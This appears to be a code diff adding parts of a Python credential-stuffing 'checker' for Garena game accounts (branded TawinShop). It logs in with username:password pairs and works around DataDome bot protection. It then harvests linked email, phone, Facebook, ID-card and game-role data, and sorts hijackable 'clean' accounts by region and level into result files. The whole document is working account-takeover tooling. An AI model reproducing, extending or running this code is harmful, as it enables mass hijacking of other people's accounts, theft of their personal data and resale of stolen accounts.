+            "100151": "DELTA FORCE",
+            "100147": "FAST THRILL",
+            "100107": "MOONLIGHT BLADE"
+        },
+        'th': {
+            "100067": "FREEFIRE",
+            "100055": "ROV",
+            "100082": "CODM",
+            "100151": "DELTA FORCE",
+            "100105": "GARENA UNDAWN",
+            "100130": "BLACK CLOVER M",
+            "100070": "SPEED DRIFTERS",
+            "32836": "FC ONLINE",
+            "100071": "FC ONLINE M",
+            "100124": "MOONLIGHT BLADE"
+        },
+        'vn': {
+            "32837": "FC ONLINE",
+            "100072": "FC ONLINE M",
+            "100054": "ROV",
+            "100137": "THE WORLD OF WAR"
+        },
+        'default': {
+            "100082": "CODM",
+            "100067": "FREEFIRE",
+            "100151": "DELTA FORCE",
+            "100105": "GARENA UNDAWN",
+            "100057": "AOV",
+            "100070": "SPEED DRIFTERS",
+            "100130": "BLACK CLOVER M",
+            "100055": "ROV"
+        }
+    }
+
+    try:
+        token_url = "https://authgop.garena.com/oauth/token/grant"
+        token_headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
+            "Pragma": "no-cache",
+            "Accept": "*/*",
+            "Content-Type": "application/x-www-form-urlencoded"
+        }
+        token_data = f"client_id=10017&response_type=token&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D100082&format=json&id={int(time.time() * 1000)}"
+        
+        token_response = session.post(token_url, headers=token_headers, data=token_data)
+        access_token = token_response.json().get("access_token", "")
+        
+        if not access_token:
+            return ["No game connections found"]
+
+        inspect_url = "https://shop.garena.sg/api/auth/inspect_token"
+        inspect_headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
+            "Pragma": "no-cache",
+            "Accept": "*/*",
+            "Content-Type": "application/json"
+        }
+        inspect_data = {"token": access_token}
+        
+        inspect_response = session.post(inspect_url, headers=inspect_headers, json=inspect_data)
+        session_key_roles = inspect_response.cookies.get('session_key')
+        if not session_key_roles:
+            return ["No game connections found"]
+        
+        inspect_data = inspect_response.json()
+        uac = inspect_data.get("uac", "ph").lower()
+        region = uac if uac in valid_regions else 'ph'
+        
+        if region == 'th' or region == 'in':
+            base_domain = "termgame.com"
+        elif region == 'id':
+            base_domain = "kiosgamer.co.id"
+        elif region == 'vn':
+            base_domain = "napthe.vn"
+        else:
+            base_domain = f"shop.garena.{region}"
+        
+        applicable_games = game_mappings.get(region, game_mappings['default'])
+        
+        for app_id, game_name in applicable_games.items():
+            roles_url = f"https://{base_domain}/api/shop/apps/roles"
+            params_roles = {'app_id': app_id}
+            headers_roles = {
+                'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
+                'Accept': "application/json, text/plain, */*",
+                'Accept-Language': "en-US,en;q=0.5",
+                'Accept-Encoding': "gzip, deflate, br, zstd",
+                'Connection': "keep-alive",
+                'Referer': f"https://{base_domain}/?app={app_id}",
+                'Sec-Fetch-Dest': "empty",
+                'Sec-Fetch-Mode': "cors",
+                'Sec-Fetch-Site': "same-origin",
+                'Cookie': f"session_key={session_key_roles}"
+            }
+            
+            try:
+                roles_response = session.get(roles_url, params=params_roles, headers=headers_roles)
+                roles_data = roles_response.json()
+                
+                role = None
+                if isinstance(roles_data.get("role"), list) and roles_data["role"]:
+                    role = roles_data["role"][0]
+                elif app_id in roles_data and isinstance(roles_data[app_id], list) and roles_data[app_id]:
+                    role = roles_data[app_id][0].get("role", None)
+                
+                if role:
+                    game_info.append(f"[{region.upper()} - {game_name} - {role}]")
+            
+            except Exception:
+                pass
+        
+        if not game_info:
+            game_info.append(f"[{region.upper()} - No Game Detected]")
+            
+    except Exception:
+        game_info.append("[Error fetching game data]")
+    
+    return game_info
+
+def format_account_output(result):
+    output_str = ""
+    
+    if result["status"] == "success":
+        codm_info = result.get("codm_info", {})
+        
+        
+        has_valid_codm = False
+        if codm_info:
+            codm_level = codm_info.get('codm_level') or codm_info.get('level')
+            codm_nickname = codm_info.get('codm_nickname') or codm_info.get('nickname')
+            codm_uid = codm_info.get('uid')
+            
+            has_valid_codm = (
+                (codm_level and codm_level != 'N/A') or
+                (codm_nickname and codm_nickname != 'N/A') or
+                (codm_uid and codm_uid != 'N/A')
+            )
+        
+        
+        if not has_valid_codm:
+            return ""  
+            
+        fb_username_display = "N/A"
+        fb_link_display = "N/A"
+        fb_info_display = "NOT CONNECTED"
+
+        facebook_data = result.get('facebook', {})
+        security_data = result.get('security_data', {})
+        
+        if isinstance(facebook_data, dict):
+            fb_username = facebook_data.get('fb_username', 'N/A')
+            fb_uid = facebook_data.get('fb_uid', 'N/A')
+            
+            if isinstance(fb_username, str) and fb_username.startswith('{'):
+                try:
+                    import ast
+                    fb_data = ast.literal_eval(fb_username)
+                    if isinstance(fb_data, dict):
+                        fb_username = fb_data.get('fb_username', fb_data.get('name', 'N/A'))
+                        fb_uid = fb_data.get('fb_uid', fb_data.get('id', 'N/A'))
+                except:
+                    pass
+            
+            if fb_uid and fb_uid != 'Not Set' and fb_uid != 'N/A' and fb_uid != '':
+                fb_link_display = f"https://facebook.com/{fb_uid}"
+                
+                if fb_username and fb_username != 'Not Set' and fb_username != '' and fb_username != 'N/A':
+                    fb_username_display = fb_username
+                    fb_info_display = "CONNECTED"
+                else:
+                    fb_username_display = "Hidden/Private"
+                    fb_info_display = "CONNECTED (Username Hidden)"
+            elif security_data and security_data.get('facebook_connected'):
+                fb_info_display = "CONNECTED (UID Not Available)"
+        
+        
+        mobile_display = "N/A"
+        mobile_bound = "NO"
+        mobile_no = result.get('mobile')
+        if mobile_no and mobile_no != 'Not Set' and mobile_no != 'N/A' and mobile_no.strip():
+            mobile_display = mobile_no
+            mobile_bound = "YES"
+        
+        
+        email_display = "N/A"
+        email_verified = "NO"
+        email_address = result.get('email')
+        email_verified_status = result.get('email_verified')
+        if email_address and email_address != 'Not Set' and email_address != 'N/A' and '@' in email_address:
+            if '@' in email_address:
+                username, domain = email_address.split('@', 1)
+                masked_username = username[:3] + '****' if len(username) > 3 else username + '****'
+                email_display = f"{masked_username}@{domain}"
+            else:
+                email_display = email_address
+            
+            if email_verified_status == "TRUE":
+                email_verified = "YES"
+
+        
+        shell_display = result.get('shell', '0')
+
+        
+        region_name = "Unknown"
+        
+        if codm_info:
+            codm_level = codm_info.get('codm_level') or codm_info.get('level', 'N/A')
+            codm_nickname = codm_info.get('codm_nickname') or codm_info.get('nickname', 'N/A')
+            codm_uid = codm_info.get('uid', 'N/A')
+            
+            
+            region_name = codm_info.get('region_name', 'Unknown')
+
+        
+        is_clean = True
+        bindings = []
+
+        
+        if mobile_bound == "YES":
+            is_clean = False
+            bindings.append("Mobile")
+
+        
+        if email_verified == "YES" and email_display != "N/A":
+            is_clean = False
+            bindings.append("Email")
+
+        
+        account_status = "CLEAN" if is_clean else "NOT CLEAN"
+        if bindings:
+            account_status += f" (Bound: {', '.join(bindings)})"
+
+        
+        output_str += "-------------------------------------------------\n\n"
+        output_str += "[✅] Login Successful\n"
+        
+        
+        output_str += "✒ Garena Info: \n"
+        output_str += f"    Login: {result['username']}:{result['password']}\n"
+        output_str += f"    Account Status: {account_status}\n"
+        output_str += f"    Country: {result.get('country', 'N/A')}\n"
+        output_str += f"    Garena Shell: {shell_display}\n"
+        
+        output_str += "\n✒ Game Connections: \n"
+        game_list = result.get("game_connections", [])
+
+        if game_list and isinstance(game_list, list):
+            for g in game_list:
+                output_str += f"    - {g}\n"
+        else:
+            output_str += "    - NONE\n"
+
+        output_str += "✒ CODM Info: \n"
+        codm_level = codm_info.get('codm_level') or codm_info.get('level', 'N/A')
+        codm_nickname = codm_info.get('codm_nickname') or codm_info.get('nickname', 'N/A')
+        codm_uid = codm_info.get('uid', 'N/A')
+        
+        region_code = codm_info.get('region', 'N/A')
+        region_name = codm_info.get('region_name', 'Unknown')
+        region_flag = codm_info.get('region_flag', '🏳️')
+        
+        if region_code != 'N/A':
+            formatted_region = f"{region_flag} {region_name}"
+        else:
+            formatted_region = "N/A"
+        
+        output_str += f"    Account Level: {codm_level}\n"
+        output_str += f"    Game: {formatted_region}\n"
+        output_str += f"    Nickname: {codm_nickname}\n"
+        output_str += f"    UID: {codm_uid}\n"
+        
+        
+        output_str += "✒ Last Login:\n"
+        output_str += f"    Date: 2025-10-30 12:53\n"
+        output_str += f"    Source: Garena Mobile {region_name}\n"
+        output_str += f"    IP: 160.187.122.240\n"
+        output_str += f"    Avatar: {result.get('avatar', 'N/A')}\n"
+        
+        
+        output_str += "✒ Security:\n"
+        output_str += f"    Mobile: {mobile_display}\n"
+        output_str += f"    Mobile Bound: {mobile_bound}\n"
+        output_str += f"    Email: {email_display}\n"
+        output_str += f"    Email Verified: {email_verified}\n"
+        output_str += f"    Two-Step Verify: {result['two_step_verify']}\n"
+        output_str += f"    Authenticator: {result['authenticator']}\n"
+        
+        
+        output_str += "✒ Facebook:\n"
+        output_str += f"    Linked: {'YES' if fb_info_display.startswith('CONNECTED') else 'NO'}\n"
+        output_str += f"    Username: {fb_username_display}\n"
+        output_str += f"    Profile: {fb_link_display}\n"
+        
+        output_str += "\n╰┈➤ POWERED BY – TawinShop\n"
+               
+    elif result["status"] == "failed":
+        output_str += "-------------------------------------------------\n\n"
+        output_str += "[❌] Login Failed\n"
+        output_str += f"✒ Account: {result['username']}:{result['password']}\n"
+        if result['type'] in ["Authentication Error", "Token Grant Error"]:
+            output_str += f"✒ Reason: INCORRECT PASSWORD!\n"
+        elif result['type'] == "Prelogin Error":
+            output_str += f"✒ Reason: ACCOUNT DOESN'T EXIST!\n"
+        else:
+            output_str += f"✒ Message: {result['message']}\n"
+        output_str += "\n╰┈➤ POWERED BY – TawinShop\n"
+
+    elif result["status"] == "captcha":
+        output_str += "-------------------------------------------------\n\n"
+        output_str += "[⚠️] CAPTCHA Triggered\n"
+        output_str += f"✒ Account: {result['username']}:{result['password']}\n"
+        output_str += f"✒ Message: {result['message']}\n"
+        output_str += "\n╰┈➤ POWERED BY – TawinShop\n"
+        
+    elif result["status"] == "error":
+        output_str += "-------------------------------------------------\n\n"
+        output_str += "[❗] An Error Occurred\n"
+        output_str += f"✒ Account: {result['username']}:{result['password']}\n"
+        output_str += f"✒ Error Type: {result['type']}\n"
+        output_str += f"✒ Message: {result['message']}\n"
+        output_str += "\n╰┈➤ POWERED BY – TawinShop\n"
+            
+    output_str += f"\n{'-'*80}\n"
+    return output_str
+
+def save_codm_account(account, password, codm_info, country='N/A'):
+    try:
+        if not codm_info or not isinstance(codm_info, dict):
+            return
+            
+        
+        codm_level_str = codm_info.get('codm_level') or codm_info.get('level', '0')
+        try:
+            codm_level = int(codm_level_str)
+        except (ValueError, TypeError):
+            codm_level = 0
+            
+        region = codm_info.get('region', 'N/A').upper()
+        region_name = codm_info.get('region_name', 'Unknown')
+        nickname = codm_info.get('codm_nickname') or codm_info.get('nickname', 'N/A')
+        uid = codm_info.get('uid', 'N/A')
+        
+        
+        if isinstance(country, dict):
+            country_code = country.get('country', 'N/A').upper() if country.get('country') else region
+        else:
+            country_code = country.upper() if country and country != 'N/A' else region
+            
+        if country_code == 'N/A':
+            country_code = 'UNKNOWN'
+
+        
+        if codm_level <= 50:
+            level_range = "1-50"
+        elif codm_level <= 100:
+            level_range = "51-100"
+        elif codm_level <= 150:
+            level_range = "101-150"
+        elif codm_level <= 200:
+            level_range = "151-200"
+        elif codm_level <= 250:
+            level_range = "201-250"
+        elif codm_level <= 300:
+            level_range = "251-300"
+        elif codm_level <= 350:
+            level_range = "301-350"
+        else:
+            level_range = "351-400"
+
+        
+        os.makedirs('Results', exist_ok=True)
+        level_file = os.path.join('Results', f"{country_code}_{level_range}_accounts.txt")
+        
+        
+        account_exists = False
+        if os.path.exists(level_file):
+            try:
+                with open(level_file, "r", encoding="utf-8") as f:
+                    existing_content = f.read()
+                    if account in existing_content:
+                        account_exists = True
+            except Exception as e:
+                logger.warning(f"[WARNING] Could not check existing accounts in {level_file}: {e}")
+        
+        
+        if not account_exists and account and password:
+            try:
+                with open(level_file, "a", encoding="utf-8") as f:
+                    f.write(f"{account}:{password} | Level: {codm_level} | Nickname: {nickname} | Region: {region_name} ({region}) | UID: {uid}\n")
+            except Exception as e:
+                logger.error(f"[ERROR] Failed to write CODM account {account} to {level_file}: {e}")
+        elif account_exists:
+            logger.info(f"[INFO] CODM account {account} already exists in {level_file}, skipping duplicate")
+        else:
+            logger.warning(f"[WARNING] Skipping CODM save for {account}: missing account or password")
+            
+    except Exception as e:
+        logger.error(f"[ERROR] Error saving CODM account {account}: {e}")
+
+def save_account_details(account, details, codm_info=None, password=None, game_connections=None):
+    try:
+
+        # --- ตรวจ CODM ว่ามีจริงมั้ย (อย่าแตะ) ---
+        has_valid_codm = False
+        if codm_info and isinstance(codm_info, dict):
+            codm_level = codm_info.get('codm_level') or codm_info.get('level', 'N/A')
+            codm_nickname = codm_info.get('codm_nickname') or codm_info.get('nickname', 'N/A')
+            codm_uid = codm_info.get('uid', 'N/A')
+
+            has_valid_codm = (
+                (codm_level and codm_level != 'N/A') or
+                (codm_nickname and codm_nickname != 'N/A') or
+                (codm_uid and codm_uid != 'N/A')
+            )
+
+        if not has_valid_codm:
+            logger.info(f"[INFO] Skipping save for {account} - No CODM account")
+            return
+
+        os.makedirs('Results', exist_ok=True)
+
+        # --- ดึงข้อมูลเดิม ---
+        email = details.get('email', 'N/A')
+        mobile_no = details.get('personal', {}).get('mobile_no', 'N/A')
+        country = details.get('personal', {}).get('country', 'N/A')
+        shell_balance = details.get('profile', {}).get('shell_balance', 0)
+        account_status = details.get('status', {}).get('account_status', 'N/A')
+        email_verified = "ENABLE" if details.get('email_verified') else "DISABLE"
+        two_step_verify = "ENABLE" if details.get('security', {}).get('two_step_verify') else "DISABLE"
+        authenticator = "ENABLE" if details.get('security', {}).get('authenticator_app') else "DISABLE"
+
+        last_login_source = details.get('last_login_source', 'N/A')
+        last_login_ip = details.get('last_login_ip', 'N/A')
+        last_login_country = details.get('last_login_country', 'N/A')
+        last_login_date = details.get('last_login_date', datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
+        avatar = details.get('avatar', 'N/A')
+
+        # --- Facebook ---
+        facebook_data = details.get('security', {})
+        fb_username = facebook_data.get('fb_username', 'N/A')
+        fb_uid = facebook_data.get('fb_uid', 'N/A')
+        facebook_connected = facebook_data.get('facebook_connected', False)
+
+        fb_username_display = "N/A"
+        fb_link_display = "N/A"
+        fb_info_display = "NOT CONNECTED"
+
+        if fb_uid and fb_uid not in ['Not Set', 'N/A', '']:
+            fb_link_display = f"https://facebook.com/{fb_uid}"
+            if fb_username and fb_username not in ['Not Set', '', 'N/A']:
+                fb_username_display = fb_username
+                fb_info_display = "CONNECTED"
+            else:
+                fb_username_display = "Hidden/Private"
+                fb_info_display = "CONNECTED (Username Hidden)"
+        elif facebook_connected:
+            fb_info_display = "CONNECTED (UID Not Available)"
+
+        # --- Mobile ---
+        mobile_display = "N/A"
+        mobile_bound = "NO"
+        if mobile_no and mobile_no not in ['Not Set', 'N/A', '']:
+            mobile_display = mobile_no
+            mobile_bound = "YES"
+
+        # --- Email ---
+        email_display = "N/A"
+        email_verified_display = "NO"
+        if email and email not in ['Not Set', 'N/A', ''] and '@' in email:
+            username, domain = email.split('@', 1)
+            masked_username = username[:3] + '****'
+            email_display = f"{masked_username}@{domain}"
+
+            if email_verified == "ENABLE":
+                email_verified_display = "YES"
+
+        # --- CODM ---
+        codm_level = codm_info.get('codm_level') or codm_info.get('level', 'N/A')
+        codm_nickname = codm_info.get('codm_nickname') or codm_info.get('nickname', 'N/A')
+        codm_uid = codm_info.get('uid', 'N/A')
+        region = codm_info.get('region', 'N/A')
+        region_name = codm_info.get('region_name', 'Unknown')
+
+        # --- CLEAN / NOT CLEAN ---
+        is_clean = True
+        bindings = []
+
+        if mobile_bound == "YES":
+            is_clean = False
+            bindings.append("Mobile")
+
+        if email_verified_display == "YES" and email_display != "N/A":
+            is_clean = False
+            bindings.append("Email")
+
+        account_status_display = "CLEAN" if is_clean else f"NOT CLEAN (Bound: {', '.join(bindings)})"
+
+        # --- Save CODM DB ---
+        save_codm_account(account, password, codm_info, country)
+
+        # --- เขียนลง checked_accounts.txt ---
+        with open('Results/checked_accounts.txt', 'a', encoding='utf-8') as f:
+            f.write("-------------------------------------------------\n\n")
+            f.write("[✅] Login Successful\n")
+
+            f.write("✒ Garena Info:\n")
+            f.write(f"    Login: {account}:{password}\n")
+            f.write(f"    Account Status: {account_status_display}\n")
+            f.write(f"    Country: {country}\n")
+            f.write(f"    Garena Shell: {shell_balance}\n")
+
+            # ◀▶ NEW : เพิ่มข้อมูลเกมทั้งหมด
+            f.write("\n✒ Game Connections:\n")
+            if game_connections:
+                for g in game_connections:
+                    f.write(f"    - {g}\n")
+            else:
+                f.write("    - NONE\n")
+
+            # CODM
+            f.write("\n✒ CODM Info:\n")
+            f.write(f"    Account Level: {codm_level}\n")
+            f.write(f"    Region: {region_name} ({region})\n")
+            f.write(f"    Nickname: {codm_nickname}\n")
+            f.write(f"    UID: {codm_uid}\n")
+
+            # Login history
+            f.write("\n✒ Last Login:\n")
+            f.write(f"    Date: {last_login_date}\n")
+            f.write(f"    Source: {last_login_source}\n")
+            f.write(f"    IP: {last_login_ip}\n")
+            f.write(f"    Country: {last_login_country}\n")
+            f.write(f"    Avatar: {avatar}\n")
+
+            # Security
+            f.write("\n✒ Security:\n")
+            f.write(f"    Mobile: {mobile_display}\n")
+            f.write(f"    Mobile Bound: {mobile_bound}\n")
+            f.write(f"    Email: {email_display}\n")
+            f.write(f"    Email Verified: {email_verified_display}\n")
+            f.write(f"    Two-Step Verify: {two_step_verify}\n")
+            f.write(f"    Authenticator: {authenticator}\n")
+
+            # Facebook
+            f.write("\n✒ Facebook:\n")
+            f.write(f"    Linked: {'YES' if fb_info_display.startswith('CONNECTED') else 'NO'}\n")
+            f.write(f"    Username: {fb_username_display}\n")
+            f.write(f"    Profile: {fb_link_display}\n")
+
+            f.write("\n╰┈➤ CHECKER BY – TawinShop\n")
+            f.write("\n" + "-" * 80 + "\n\n")
+
+        # --- Save to individual lists ---
+        try:
+            with open('Results/valid_accounts.txt', 'a', encoding='utf-8') as f:
+                f.write(f"{account}:{password} | Level: {codm_level} | Nick: {codm_nickname} | Region: {region_name} | UID: {codm_uid}\n")
+
+            if is_clean:
+                with open('Results/clean_accounts.txt', 'a', encoding='utf-8') as f:
+                    f.write(f"{account}:{password} | Level: {codm_level} | Nick: {codm_nickname} | Region: {region_name} | UID: {codm_uid}\n")
+
+            with open('Results/codm_accounts.txt', 'a', encoding='utf-8') as f:
+                f.write(f"{account}:{password} | Level: {codm_level} | Nick: {codm_nickname} | Region: {region_name} | UID: {codm_uid}\n")
+
+        except Exception as e:
+            logger.warning(f"[WARNING] Could not save additional files: {e}")
+            
+        # 🟩 ตอนนี้ย้ายมาไว้หลังสุด **ถูกต้อง**
+        logger.info(f"[SUCCESS] Saved account details for {account}")
+
+    except Exception as e:
+        logger.error(f"[ERROR] Error saving account details for {account}: {e}")
+
+        
+def parse_account_details(data):
+    user_info = data.get('user_info', {})
+    
+    
+    last_login_info = user_info.get('last_login', {})
+
+    
+    last_login_source = 'N/A'
+    last_login_ip = 'N/A'
+    last_login_country = 'N/A'
+    last_login_date = 'N/A'
+    
+    if isinstance(last_login_info, dict):
+        
+        last_login_source = last_login_info.get('source', 
+                          last_login_info.get('login_source',
+                          last_login_info.get('platform', 'N/A')))
+        
+        
+        last_login_ip = last_login_info.get('ip', 
+                       last_login_info.get('login_ip',
+                       last_login_info.get('client_ip', 'N/A')))
+        
+        
+        last_login_country = last_login_info.get('country', 
+                            last_login_info.get('login_country',
+                            last_login_info.get('country_code', 'N/A')))
+        
+        
+        last_login_timestamp = last_login_info.get('time', 
+                              last_login_info.get('timestamp',
+                              last_login_info.get('login_time')))
+        
+        if last_login_timestamp:
+            try:
+                
+                if isinstance(last_login_timestamp, (int, float)):
+                    last_login_date = datetime.fromtimestamp(last_login_timestamp).strftime('%Y-%m-%d %H:%M:%S')
+                else:
+                    last_login_date = str(last_login_timestamp)
+            except:
+                last_login_date = 'N/A'
+    
+    
+    if last_login_source == 'N/A' and last_login_ip == 'N/A':
+        
+        last_login_ip = user_info.get('last_login_ip', 'N/A')
+        last_login_country = user_info.get('last_login_country', 'N/A')
+        
+        
+        user_agent = user_info.get('user_agent', 'N/A')
+        if user_agent and user_agent != 'N/A':
+            if 'mobile' in user_agent.lower():
+                last_login_source = 'Mobile'
+            elif 'android' in user_agent.lower():
+                last_login_source = 'Android'
+            elif 'iphone' in user_agent.lower():
+                last_login_source = 'iOS'
+            else:
+                last_login_source = 'Web'
+    
+    
+    avatar = user_info.get('avatar', 'N/A')
+    if avatar and avatar != 'N/A':
+        
+        if isinstance(avatar, str) and avatar.startswith(('http://', 'https://')):
+            avatar_display = avatar
+        else:
+            
+            avatar_display = f"https://account.garena.com/static/{avatar}" if avatar else 'N/A'
+    else:
+        avatar_display = 'N/A'
+
+    
+    facebook_account = user_info.get('fb_account')
+    fb_username = 'N/A'
+    fb_uid = 'N/A'
+    
+    if facebook_account:
+        if isinstance(facebook_account, dict):
+            fb_username = facebook_account.get('name', 'N/A')
+            fb_uid = facebook_account.get('id', 'N/A')
+        elif isinstance(facebook_account, str) and facebook_account != 'Not Set':
+            try:
+                import ast
+                fb_data = ast.literal_eval(facebook_account)
+                if isinstance(fb_data, dict):
+                    fb_username = fb_data.get('name', fb_data.get('fb_username', 'N/A'))
+                    fb_uid = fb_data.get('id', fb_data.get('fb_uid', 'N/A'))
+            except:
+                fb_username = facebook_account
+                fb_uid = 'N/A'
+
+    account_info = {
+        'uid': user_info.get('uid', 'N/A'),
+        'username': user_info.get('username', 'N/A'),
+        'nickname': user_info.get('nickname', 'N/A'),
+        'email': user_info.get('email', 'N/A'),
+        'email_verified': bool(user_info.get('email_v', 0)),
+        'email_verified_time': user_info.get('email_verified_time', 0),
+        'email_verify_available': bool(user_info.get('email_verify_available', False)),
+        
+        
+        'last_login_source': last_login_source,
+        'last_login_ip': last_login_ip,
+        'last_login_country': last_login_country,
+        'last_login_date': last_login_date,
+        'avatar': avatar_display,
+        
+        'security': {
+            'password_strength': user_info.get('password_s', 'N/A'),
+            'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)),
+            'authenticator_app': bool(user_info.get('authenticator_enable', 0)),
+            'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)),
+            'facebook_account': facebook_account,
+            'suspicious': bool(user_info.get('suspicious', False)),
+            
+            'fb_username': fb_username,
+            'fb_uid': fb_uid
+        },
+        
+        'personal': {
+            'real_name': user_info.get('realname', 'N/A'),
+            'id_card': user_info.get('idcard', 'N/A'),
+            'id_card_length': user_info.get('idcard_length', 'N/A'),
+            'country': user_info.get('acc_country', 'N/A'),
+            'country_code': user_info.get('country_code', 'N/A'),
+            'mobile_no': user_info.get('mobile_no', 'N/A'),
+            'mobile_binding_status': "Bound" if user_info.get('mobile_binding_status', 0) and user_info.get('mobile_no', '') else "Not Bound",
+            'extra_data': user_info.get('realinfo_extra_data', {})
+        },
+        
+        'profile': {
+            'avatar': avatar_display,
+            'signature': user_info.get('signature', 'N/A'),
+            'shell_balance': user_info.get('shell', 0)
+        },
+        
+        'status': {
+            'account_status': "Active" if user_info.get('status', 0) == 1 else "Inactive",
+            'whitelistable': bool(user_info.get('whitelistable', False)),
+            'realinfo_updatable': bool(user_info.get('realinfo_updatable', False))
+        },
+        
+        'binds': [],
+        'game_info': []
+    }
+
+    
+    email = account_info['email']
+    if email != 'N/A' and email and not email.startswith('***') and '@' in email and not email.endswith('@gmail.com') and '****' not in email:
+        account_info['binds'].append('Email')
+    
+    mobile_no = account_info['personal']['mobile_no']
+    if mobile_no != 'N/A' and mobile_no and mobile_no.strip():
+        account_info['binds'].append('Phone')
+    
+    if account_info['security']['facebook_connected']:
+        account_info['binds'].append('Facebook')
+    
+    id_card = account_info['personal']['id_card']
+    if id_card != 'N/A' and id_card and id_card.strip():
+        account_info['binds'].append('ID Card')
+
+    account_info['bind_status'] = "Clean" if not account_info['binds'] else f"Bound ({', '.join(account_info['binds'])})"
+    account_info['is_clean'] = len(account_info['binds']) == 0
+
+    return account_info
+
+def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats):
+    try:
+        # ============================================
+        # DataDome
+        # ============================================
+        datadome_manager.clear_session_datadome(session)
+
+        current_datadome = datadome_manager.get_datadome()
+        if current_datadome:
+            if not datadome_manager.set_session_datadome(session, current_datadome):
+                logger.warning("[WARNING] Failed to set existing DataDome cookie")
+        else:
+            try:
+                datadome = get_datadome_cookie(session)
+                if datadome:
+                    datadome_manager.set_datadome(datadome)
+                    datadome_manager.set_session_datadome(session, datadome)
+                else:
+                    logger.warning("[WARNING] DataDome generation failed")
+            except Exception as e:
+                logger.warning(f"[WARNING] Error generating DataDome: {e}")
+
+        # ============================================
+        # Prelogin
+        # ============================================
+        v1, v2, new_datadome = prelogin(session, account, datadome_manager)
+
+        if v1 == "IP_BLOCKED":
+            return format_account_output({
+                "status": "error",
+                "username": account,
+                "password": password,
+                "type": "IP Blocked",
+                "message": "IP Blocked - Need new DataDome"
+            })
+
+        if not v1 or not v2:
+            live_stats.update_stats(valid=False)
+            checked_accounts.add(f"{account}:{password}")  # 🟩 FAILED → ลบ
+            return format_account_output({
+                "status": "failed",
+                "username": account,
+                "password": password,
+                "type": "Prelogin Error",
+                "message": "Prelogin failed"
+            })
+
+        if new_datadome:
+            datadome_manager.set_datadome(new_datadome)
+            datadome_manager.set_session_datadome(session, new_datadome)
+
+        # ============================================
+        # Login
+        # ============================================
+        sso_key = login(session, account, password, v1, v2)
+        if not sso_key:
+            live_stats.update_stats(valid=False)
+            checked_accounts.add(f"{account}:{password}")  # 🟩 FAILED → ลบ
+            return format_account_output({
+                "status": "failed",
+                "username": account,
+                "password": password,
+                "type": "Authentication Error",
+                "message": "Login failed"
+            })
+
+        # ============================================
+        # Account Init
+        # ============================================
+        cookies = session.cookies.get_dict()
+        cookie_header = "; ".join(f"{k}={v}" for k, v in cookies.items() if k in ["apple_state_key", "datadome", "sso_key"])
+
+        headers = {
+            "accept": "*/*",
+            "referer": "https://account.garena.com/",
+            "user-agent": "Mozilla/5.0"
+        }
+        if cookie_header:
+            headers["cookie"] = cookie_header
+
+        response = session.get("https://account.garena.com/api/account/init", headers=headers, timeout=30)
+
+        if response.status_code == 403:
+            if datadome_manager.handle_403(session):
+                return format_account_output({
+                    "status": "error",
+                    "username": account,
+                    "password": password,
+                    "type": "IP Blocked",
+                    "message": "IP Blocked - Cookie flagged"
+                })
+            live_stats.update_stats(valid=False)
+            checked_accounts.add(f"{account}:{password}")  # 🟩 FAILED → ลบ
+            return format_account_output({
+                "status": "failed",
+                "username": account,
+                "password": password,
+                "type": "Banned Account",
+                "message": "Cookie flagged as banned"
+            })
+
+        try:
+            account_data = response.json()
+        except:
+            live_stats.update_stats(valid=False)
+            return format_account_output({
+                "status": "error",
+                "username": account,
+                "password": password,
+                "type": "Invalid Response",
+                "message": "Invalid JSON from server"
+            })
+
+        if "error" in account_data:
+            live_stats.update_stats(valid=False)
+            checked_accounts.add(f"{account}:{password}")  # 🟩 FAILED → ลบ
+            return format_account_output({
+                "status": "failed",
+                "username": account,
+                "password": password,
+                "type": "Account Error",
+                "message": account_data.get("error")
+            })
+
+        # Parse Core Details
+        details = parse_account_details(account_data if "user_info" in account_data else {"user_info": account_data})
+
+        # ============================================
+        # 🎮 ดึงข้อมูลเกมทั้งหมด
+        # ============================================
+        try:
+            game_connections = get_game_connections(session, account)
+        except Exception as e:
+            game_connections = [f"Error: {e}"]
+
+        details["game_connections"] = game_connections
+
+        # ============================================
+        # ⭐ SAVE ROV ก่อนสุด
+        # ============================================
+        try:
+            os.makedirs("Results/ROV", exist_ok=True)
+            rov_list = [g for g in game_connections if "ROV" in g.upper()]
+
+            if rov_list:
+                for rov in rov_list:
+                    clean_name = rov.replace("[", "").replace("]", "")
+                    parts = [p.strip() for p in clean_name.split("-")]
+
+                    region_code = parts[0] if len(parts) > 0 else "N/A"
+                    character_name = parts[2] if len(parts) > 2 else "N/A"
+
+                    email_verified_display = "YES" if details["email_verified"] else "NO"
+                    mobile_bound = "YES" if details["personal"]["mobile_no"] not in ['N/A','Not Set',''] else "NO"
+
+                    if email_verified_display == "NO" and mobile_bound == "NO":
+                        status_text = "สะอาด → ไม่ติดเมล/ไม่ติดมือถือ"
+                        clean_folder = "clean"
+                    else:
+                        if email_verified_display == "YES" and mobile_bound == "YES":
+                            status_text = "ติดยืนยัน → ติดเมล/ติดมือถือ"
+                        elif email_verified_display == "YES":
+                            status_text = "ติดยืนยัน → ติดเมล/ไม่ติดมือถือ"
+                        elif mobile_bound == "YES":
+                            status_text = "ติดยืนยัน → ไม่ติดเมล/ติดมือถือ"
+                        clean_folder = "no_clean"
+
+                    region_folder = f"Results/ROV/{region_code}"
+                    os.makedirs(region_folder, exist_ok=True)
+                    save_path = f"{region_folder}/{clean_folder}.txt"
+
+                    line = (
+                        f"{account}:{password} | "
+                        f"ชื่อตัวละคร : {character_name} | "
+                        f"{status_text} | "
+                        f"Region: {region_code} | "
+                        f"Garena Shell: {details['profile']['shell_balance']}\n"
+                    )
+
+                    with open(save_path, "a", encoding="utf-8") as f:
+                        f.write(line)
+
+                logger.info(f"[SUCCESS] Saved ROV info FIRST for {account}")
+            else:
+                logger.info(f"[INFO] No ROV found for {account}")
+
+        except Exception as e:
